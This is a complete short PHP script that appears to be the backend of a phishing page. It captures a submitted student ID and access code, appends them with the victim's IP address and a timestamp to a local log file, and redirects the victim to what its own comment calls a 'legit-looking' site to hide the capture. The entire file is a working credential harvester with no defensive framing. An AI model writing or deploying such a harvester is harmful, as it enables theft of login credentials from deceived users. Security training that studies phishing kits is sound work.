<?php
date_default_timezone_set('Asia/Kolkata');

$student_id = $_POST['student_id'] ?? 'N/A';
$access_code = $_POST['access_code'] ?? 'N/A';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d H:i:s");

$log = "Time: $time | IP: $ip | ID: $student_id | Code: $access_code\n";

file_put_contents("log.txt", $log, FILE_APPEND);

// Redirect to legit-looking site after login
header("Location: https://redteamacademy.com");
exit();
?>

